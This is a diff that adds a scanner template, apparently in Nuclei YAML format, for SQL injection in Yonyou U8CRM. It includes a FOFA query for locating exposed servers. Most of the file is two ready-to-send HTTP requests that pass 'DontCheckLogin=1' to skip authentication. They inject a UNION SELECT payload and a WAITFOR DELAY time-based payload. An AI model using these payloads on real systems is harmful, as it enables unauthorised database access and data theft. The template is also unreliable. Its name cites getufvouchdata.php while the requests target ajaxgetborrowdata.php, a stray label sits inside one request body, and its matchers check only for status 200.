@@ -1,0 +1,67 @@
+id: poc-hwm0linga4xq0eob
+info:
+  name: 用友U8CRM getufvouchdata.php SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hwm0linga4xq0eob'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hwm0linga4xq0eob
+    fofa: title="用友U8CRM"
+http:
+- raw:
+  - 'POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    Connection: close
+
+
+    cWhCode=1''+UNION+ALL+SELECT+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(114)+CHAR(87)+CHAR(120)+CHAR(74)+CHAR(66)+CHAR(106)+CHAR(85)+CHAR(98)+CHAR(86)+CHAR(74)+CHAR(75)+CHAR(68)+CHAR(108)+CHAR(99)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(74)+CHAR(114)+CHAR(73)+CHAR(76)+CHAR(77)+CHAR(101)+CHAR(70)+CHAR(122)+CHAR(88)+CHAR(86)+CHAR(103)+CHAR(81)+CHAR(99)+CHAR(107)+CHAR(65)+CHAR(68)+CHAR(67)+CHAR(85)+CHAR(76)+CHAR(79)+CHAR(122)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(98)+CHAR(113)--+KRVC
+
+
+    延时注入：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getInvOtherInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    Connection: close
+
+
+    cInvCode=1'';WAITFOR+DELAY+''0:0:5''--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
